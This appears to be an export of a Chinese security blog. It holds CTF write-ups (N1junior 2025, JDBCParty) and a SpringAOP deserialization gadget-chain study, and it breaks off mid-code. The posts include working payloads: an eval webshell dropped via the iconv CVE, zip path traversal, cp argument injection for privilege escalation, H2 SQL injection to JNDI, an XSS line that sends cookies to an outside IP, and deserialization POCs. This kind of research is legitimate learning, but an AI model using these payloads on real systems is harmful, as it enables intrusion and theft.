[{"categories":["WP"],"contents":"Gavatar 一个php服务\n这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以\nif (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用\n也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用\nhttps://www.ambionics.io/blog/iconv-cve-2024-2961-p1\n因为不是直接返回文件内容，而是需要我们从avatar.php中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可\ndef download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://39.106.16.204:20871/avatar.php?user=123\u0026#34;) print(response) data = response.text return base64.decode(data) 然后跑exp就好了\npython test.py http://39.106.16.204:20871/upload.php \u0026#34;echo \u0026#39;\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;\u0026#39; \u0026gt; shell.php\u0026#34; tarefik go服务，代码很少，只有一个main.go,这里可以看到直接写了一个flag接口获取flag\nr.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) 但是我们可以从Dockerfile里面看到实际上并不是直接将服务暴露在外网，而是使用了tarefik进行了一个代理转发\ntraefik.yml\nproviders: file: filename: /app/.config/dynamic.yml entrypoints: web: address: \u0026#34;:80\u0026#34; dynamic.yml\nhttp: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy 只转发了index和upload两个接口\n我们这里可以从官方文档知道，转发端口这一些的服务配置，都是可以热加载的\n那我们接下来的目的就是想能否可以重写dynamic.yml，写入我们的配置，将flag端口转发出来就能达到getflag\n我们将目光转到upload接口上\nr.POST(\u0026#34;/public/upload\u0026#34;, func(c *gin.Context) { file, err := c.FormFile(\u0026#34;file\u0026#34;) if err != nil { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;File upload failed\u0026#34;}) return } randomFolder := randFileName() destDir := filepath.Join(uploadDir, randomFolder) if err := os.MkdirAll(destDir, 0755); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to create directory\u0026#34;}) return } zipFilePath := filepath.Join(uploadDir, randomFolder+\u0026#34;.zip\u0026#34;) if err := c.SaveUploadedFile(file, zipFilePath); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to save uploaded file\u0026#34;}) return } if err := unzipFile(zipFilePath, destDir); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to unzip file\u0026#34;}) return } c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: fmt.Sprintf(\u0026#34;File uploaded and extracted successfully to %s\u0026#34;, destDir), }) }) unzipFile\nfunc unzipFile(zipPath, destDir string) error { zipReader, err := zip.OpenReader(zipPath) if err != nil { return err } defer zipReader.Close() for _, file := range zipReader.File { filePath := filepath.Join(destDir, file.Name) if file.FileInfo().IsDir() { if err := os.MkdirAll(filePath, file.Mode()); err != nil { return err } } else { err = unzipSimpleFile(file, filePath) if err != nil { return err } } } return nil } 这里需要我们上传一个zip文件，然后放到unzipFile函数下进行一个解压\n看到unzipFile中使用了filepath.Join后，联想到了python里的path.join，想着能否把压缩包内的文件名写成../开头的形式，这样的话我们就能成功目录穿越，然后覆盖配置文件了\n尝试出来是可以的，这里我写了个python脚本来达到目的\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary=open(\u0026#34;config/dynamic.yml\u0026#34;,\u0026#34;r\u0026#34;).read() zipFile = zipfile.ZipFile(\u0026#34;test2.zip\u0026#34;, \u0026#34;w\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test2.zip\u0026#34;) zipFile.writestr(\u0026#34;../../.config/dynamic.yml\u0026#34;, binary) zipFile.writestr(\u0026#34;1234.txt\u0026#34;,binary) zipFile.close() except IOError as e: raise e 然后dynamic.yml内容如下,由于XFF头的存在，我们还需要额外加一个添加请求头的中间件\nhttp: middlewares: # 定义添加请求头的中间件 add-headers: headers: customRequestHeaders: X-Forwarded-For: 127.0.0.1 services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy middlewares: - add-headers # 应用中间件 upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy middlewares: - add-headers # 应用中间件 flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - add-headers backup 在html的最下面我们可以看到一个注释\n然后我们简单绕一下非法传参名就可以了，这是一个shell接口，我们能够直接发命令,所以这里弹个shell方便接下来的操作\nflag是400权限，我们这里需要提权\n根目录下面发现了一个backup.sh，内容如下\n#!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done 一个死循环，重复进行了cp chmod的操作\n这里我去ps aux看了一眼，是root一直在执行\n那我们接下来就是在这个backup.sh上做下一步操作了\n我们想要的是能否在primary目录下创建一个指向/flag的软连接，然后cp将软连接所指向的flag文件复制到backup文件夹下，再利用内部自带的chmod命令使我们可读\n但是这里cp使用了-P参数，在help中对该参数解释如下\n-P, --no-dereference never follow symbolic links in SOURC 这不是寄了吗?\n但是cp的对象是*参数，这个*参数可以帮助我们注入参数项(一些命令的提权手法就是用到这个操作比如chmod tar等等,不了解的可以上网搜搜)\n我们想要的参数项是这个,允许复制软连接所对应的文件\n-L, --dereference always follow symbolic links in SOURCE 由于两个相反的参数会被位置较后的参数所覆盖，我们接下来的操作就是\n创建一个文件名为-L的文件 创建指向flag的软连接 等sh执行 cat flag 命令如下\ncd /var/www/html/primary \u0026gt;-L ln -s /flag flag cd ../backup cat flag EasyDB 服务给我们的有用接口只有一个登陆接口\n@PostMapping({\u0026#34;/login\u0026#34;}) public String handleLogin(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) throws SQLException { if (this.userService.validateUser(username, password)) { session.setAttribute(\u0026#34;username\u0026#34;, username); return \u0026#34;redirect:/\u0026#34;; } else { model.addAttribute(\u0026#34;error\u0026#34;, \u0026#34;Invalid username or password\u0026#34;); return \u0026#34;login\u0026#34;; } } validateUser中存在着sql注入漏洞\npublic boolean validateUser(String username, String password) throws SQLException { String query = String.format(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;%s\u0026#39; AND password = \u0026#39;%s\u0026#39;\u0026#34;, username, password); if (!SecurityUtils.check(query)) { return false; } else { Throwable var8; try (Statement stmt = this.connection.createStatement()) { stmt.executeQuery(query); ResultSet resultSet = stmt.getResultSet(); Throwable var7 = null; try { var8 = resultSet.next(); } catch (Throwable var31) { var8 = var31; var7 = var31; throw var31; } finally { if (resultSet != null) { if (var7 != null) { try { resultSet.close(); } catch (Throwable var30) { var7.addSuppressed(var30); } } else { resultSet.close(); } } } } return (boolean)var8; } } 然后数据库类型是h2数据库，且executeQuery()支持解析多条语句，那就是很平常的h2打法了，因为题目出网，绕黑名单我用的是JNDI注入，不过不出网的话也可以打其他的，方法很多\npayload如下\nadmin\u0026#39;;CREATE ALIAS abc AS \u0026#39;String rce(String cmd) throws Exception { new javax.naming.InitialContext().lookup(cmd); return \u0026#34;123\u0026#34;;}\u0026#39;;--\u0026amp;password=123 admin\u0026#39;;CALL abc (\u0026#39;ldap://ip:1389/Deserialize/Jackson/Command/反弹shell命令\u0026#39;);--\u0026amp;password=123 display 这题猪了，一开始以为是DOMPurify的0day，看了一个多小时没戏直接跑路玩游戏去了\n第二天看到hint出了之后很快就有人解了才返回来看这道题,结果才发现\nconst sanitizedText = sanitizeContent(atob(decodeURI(queryText))); console.log(sanitizedText) if (sanitizedText.length \u0026gt; 0) { textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 insertButton.disabled = false; } else { textInput.innerText = \u0026#34;Only allow h1, h2 tags and plain text\u0026#34;; } 这里contentDisplay的值是textInput的innerText啊(就是textInput在浏览器上展示的字符)\n那就可以很简单的利用html实体编码来绕过\n可以看到很成功的插入我们的标签，但是这里并没有被DOM所渲染，这里就用到hint了\n我们使用iframe框架来插入script\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://111.229.198.6:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe 可以看到成功执行了，也成功被csp拦了(\n接下来的绕csp就其实很简单了，在前段时间的sekaiCTF做过相同的题\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\n就是利用了404的页面来写入我们的js代码，再用src进行引入就行了\n这里不讲太多，直接贴payload\n\u0026lt;iframe srcdoc=\u0026#34;\u0026lt;script src=\u0026#39;/a/;fetch(%60http://ip:5000/%60+document.cookie);//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ","date":"2025-02-11T23:00:00+08:00","permalink":"http://localhost:1313/post/2025n1junior-wp/","section":"post","tags":null,"title":"[2025]N1junior-WP"},{"categories":["Java安全"],"contents":"前言 在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下\n正文 依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类\n流程 调用链如下\nJdkDynamicAopProxy.invoke()-\u0026gt;\rReflectiveMethodInvocation.proceed()-\u0026gt;\rAspectJAroundAdvice-\u0026gt;invoke-\u0026gt;\rorg.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-\u0026gt;\rmethod.invoke() 执行类是org.springframework.aop.aspectj.AbstractAspectJAdvice的invokeAdviceMethodWithGivenArgs方法\nprotected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {\rObject[] actualArgs = args;\rif (this.aspectJAdviceMethod.getParameterCount() == 0) {\ractualArgs = null;\r}\rtry {\rReflectionUtils.makeAccessible(this.aspectJAdviceMethod);\rreturn this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);\r} catch (IllegalArgumentException ex) {\rthrow new AopInvocationException(\u0026#34;Mismatch on arguments to advice method [\u0026#34; + this.aspectJAdviceMethod + \u0026#34;]; pointcut expression [\u0026#34; + this.pointcut.getPointcutExpression() + \u0026#34;]\u0026#34;, ex);\r} catch (InvocationTargetException ex) {\rthrow ex.getTargetException();\r}\r} 直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大\n在他的实现子类，在他的子类基本上invoke(before)方法的都调用了他的invokeAdviceMethod方法的，所以我们只需要找到一个方法能够调用invoke(before)即可\n然后下一步找到了ReflectiveMethodInvocation类,他的proceed就能够满足我们上面的要求\n接下来在JdkDynamicAopProxy的invoke方法将会调用proceed方法\n这里有一点很有趣，就是ReflectiveMethodInvocation类是没有实现serializable接口的，所以我们不能将这个类放进我们的writeObject里面，但是在JdkDynamicAopProxy直接帮我们new了一个新的出来,也是很巧了\n然后流程大致就是这样，接下来我们说一下payload执行中的一些知识点\n构建payload中所需注意的 触发JdkDynamicAopProxy的invoke方法有很多种操作方式了，从invoke的触发流程来看，下面这俩method是肯定触发不了这条链子的，会提前return导致我们想要执行的代码没执行到\nhashcode()\requals() 所以我们这里使用了平常非常常见的toString入口类\n上面流程的图片也看到了，如果要走到proceed方法那里，那首先还得过一下chain.isEmpty()这个判断\nchain由以下代码产生\nList\u0026lt;Object\u0026gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); public List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rMethodCacheKey cacheKey = new MethodCacheKey(method);\rList\u0026lt;Object\u0026gt; cached = (List)this.methodCache.get(cacheKey);\rif (cached == null) {\rcached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);\rthis.methodCache.put(cacheKey, cached);\r}\rreturn cached;\r} 因为methodCache由transient修饰，不能在反序列化中被恢复，所以这里的methodCache一开始一定为空，那我们就要看到getInterceptorsAndDynamicInterceptionAdvice方法了\nadvisorChainFactory对应的接口实现类只有DefaultAdvisorChainFactory，这里只能看看它的\npublic List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) {\rAdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();\rAdvisor[] advisors = config.getAdvisors();\rList\u0026lt;Object\u0026gt; interceptorList = new ArrayList(advisors.length);\rClass\u0026lt;?\u0026gt; actualClass = targetClass != null ? targetClass : method.getDeclaringClass();\rBoolean hasIntroductions = null;\rfor(Advisor advisor : advisors) {\rif (advisor instanceof PointcutAdvisor) {\rPointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;\rif (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {\rMethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();\rboolean match;\rif (mm instanceof IntroductionAwareMethodMatcher) {\rif (hasIntroductions == null) {\rhasIntroductions = hasMatchingIntroductions(advisors, actualClass);\r}\rmatch = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);\r} else {\rmatch = mm.matches(method, actualClass);\r}\rif (match) {\rMethodInterceptor[] interceptors = registry.getInterceptors(advisor);\rif (mm.isRuntime()) {\rfor(MethodInterceptor interceptor : interceptors) {\rinterceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));\r}\r} else {\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\r}\r} else if (advisor instanceof IntroductionAdvisor) {\rIntroductionAdvisor ia = (IntroductionAdvisor)advisor;\rif (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r} else {\rInterceptor[] interceptors = registry.getInterceptors(advisor);\rinterceptorList.addAll(Arrays.asList(interceptors));\r}\r}\rreturn interceptorList;\r} 我们可以发现，不管是那种方式添加进入interceptorList的，其所对应的成员往往是从registry.getInterceptors(advisor);来的\n那这里我们顺藤摸瓜,registry所对应的类是DefaultAdvisorAdapterRegistry\n对应的getInterceptors代码如下\n那这里我们只有从第一个判断口进入才能够添加interceptors，不过要求是我们的advisor必须实现了MethodInterceotor接口,简单看了一下继承关系，和文章师傅里得出的结论一样：没有同时实现了该接口的advisor类\n面对此种情况，我们使用了动态代理去将MethodInterceotor给advisor类代理上，使其实现双接口\n这里又用到了一次JdkDynamicAopProxy,不过和前面的作用完全不同\n然后这里就能够顺利return回我们想要的interceptors,chain也能执行到我们的proceed方法了\n最后就是在我们的org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs中\nthis.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs); 这里还要从aspectInstanceFactory中获取到一个方法类的实例,文章中是使用了SingletonAspectInstanceFactory这个类\n和CC里的ConstantTransformer很相似\nPOC import Utils.Util;\rimport com.fasterxml.jackson.databind.node.POJONode;\rimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\rimport javassist.ClassPool;\rimport javassist.CtClass;\rimport javassist.CtConstructor;\rimport org.aopalliance.aop.Advice;\rimport org.aopalliance.intercept.MethodInterceptor;\rimport org.springframework.aop.aspectj.AbstractAspectJAdvice;\rimport org.springframework.aop.aspectj.AspectJAroundAdvice;\rimport org.springframework.aop.aspectj.AspectJExpressionPointcut;\rimport org.springframework.aop.aspectj.SingletonAspectInstanceFactory;\rimport org.springframework.aop.framework.AdvisedSupport;\rimport org.springframework.aop.support.DefaultIntroductionAdvisor;\rimport org.springframework.core.Ordered;\rimport java.lang.reflect.*;\rimport java.util.PriorityQueue;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport javax.management.BadAttributeValueExpException;\rimport javax.xml.transform.Templates;\rpublic class main {\rpublic static void main(String[] args) throws Exception {\rClassPool pool = ClassPool.getDefault();\rCtClass clazz = pool.makeClass(\u0026#34;a\u0026#34;);\rCtClass superClass = pool.get(AbstractTranslet.class.getName());\rclazz.setSuperclass(superClass);\rCtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);\rconstructor.setBody(\u0026#34;Runtime.getRuntime().exec(\\\u0026#34;open -na Calculator\\\u0026#34;);\u0026#34;);\rclazz.addConstructor(constructor);\rbyte[][] bytes = new byte[][]{clazz.toBytecode()};\rTemplatesImpl templates = TemplatesImpl.class.newInstance();\rUtil.setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, bytes);\rUtil.setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;GSBP\u0026#34;);\rUtil.setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, null);\rMethod method=templates.getClass().getMethod(\u0026#34;newTransformer\u0026#34;);//获取newTransformer方法\rSingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);\rAspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);\rProxy proxy1 = (Proxy) getAProxy(advice,Advice.class);\rBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);\rUtil.setFieldValue(badAttributeValueExpException, \u0026#34;val\u0026#34;, proxy1);\rUtil.deserialize(Util.serialize(badAttributeValueExpException));\r}\rpublic static Object getBProxy(Object obj,Class[] clazzs) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);\rreturn proxy;\r}\rpublic static Object getAProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception\r{\rAdvisedSupport advisedSupport = new AdvisedSupport();\radvisedSupport.setTarget(obj);\rAbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;\rDefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));\radvisedSupport.addAdvisor(advisor);\rConstructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class);\rconstructor.setAccessible(true);\rInvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\rObject proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);\rreturn proxy;\r}\r} 参考文章 https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\n","date":"2025-01-23T23:33:31+08:00","permalink":"http://localhost:1313/post/springaop/","section":"post","tags":null,"title":"SpringAOP链学习"},{"categories":["Java安全","WP"],"contents":"起因 本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute+Jackson死活没通，后面自己调试了一下，这里做个记录\n题目分析 题目名叫JDBCParty,jdk版本是17，里面给了个接口源码如下\n@PostMapping({\u0026#34;/dbtest\u0026#34;}) public ResponseEntity\u0026lt;String\u0026gt; dbtest(String data) { try { User credentials = (User)Utils.deserialize(data); Class.forName(this.driverClassName); try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) { if (connection.isValid(5)) { return ResponseEntity.ok(\u0026#34;connect success\u0026#34;); } else { return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed\u0026#34;); } } } catch (Exception e) { e.printStackTrace(); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\u0026#34;connect failed \u0026#34; + e.getMessage()); } } } 表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。\n实际入口是那个反序列化，从这个反序列化里面做文章\n然后看看题目给的依赖\n- \u0026#34;BOOT-INF/lib/spring-boot-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.5.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.23.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-2.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-2.0.16.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-6.1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-swing-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-anim-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-parser-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-svg-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-awt-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-io-1.3.1.jar\u0026#34; - \u0026#34;BOOT-INF/lib/commons-logging-1.0.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-bridge-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-xml-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-css-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-dom-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xalan-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/serializer-2.7.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-1.4.01.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-ext-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gui-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-gvt-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-script-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-shared-resources-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-util-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-constants-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/batik-i18n-1.14.jar\u0026#34; - \u0026#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar\u0026#34; - \u0026#34;BOOT-INF/lib/fastjson2-2.0.37.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar\u0026#34; 有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作\n解 所以这里需要我们通过反序列化创造一个jndi注入\n这里就想到了24年的N1junior里的Derby Plus，里面是通过CB+LdapAttribute来实现了一个JNDI注入\n这里我们没有CB，但是有Fastjson2和jackson可以触发getter，在比赛的时候我写的poc如下\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; //import static org.example.Main.deserial; //import static org.example.Main.serial; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //获取基类模块 Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //获取caller类的module field的地址 long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //直接将基类module的值覆盖在我们的地址上 unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static String serialize(Object object) throws IOException { 